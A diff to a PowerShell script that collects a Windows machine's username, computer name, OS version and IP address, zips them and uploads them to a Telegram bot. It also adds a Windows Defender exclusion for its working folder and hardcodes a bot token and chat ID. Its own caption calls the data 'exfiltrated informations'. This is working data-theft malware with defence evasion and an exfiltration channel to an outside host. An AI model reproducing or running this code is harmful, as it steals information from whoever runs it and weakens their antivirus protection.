@@ -9,8 +9,25 @@ Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
 
-#Create content
-"Have a nice day" | Set-Content "$dumpFolder\message.txt"
+#Extract data
+try {
+    $userName = $env:USERNAME
+    $computerName = $env:COMPUTERNAME
+    $dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
+    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|Teredo' } | Select-Object -First 1).IPAddress
+
+    $sysInfo = @"
+User Name: $userName
+Computer Name: $computerName
+Date/Time: $dateTime
+OS Version: $osVersion
+IP Address: $ipAddress
+"@
+
+    $sysInfo | Out-File -FilePath "$dumpFolder\system_info.txt" -Encoding UTF8
+} catch {}
+
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
@@ -23,7 +40,7 @@ while (!(Test-Path "$dumpFile")) {
 # Telegram configuration
 $token = "8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o"
 $chatID = "7398435102"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
+$uri = "https://api.telegram.org/bot8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
 
 # Check if the file exists before sending
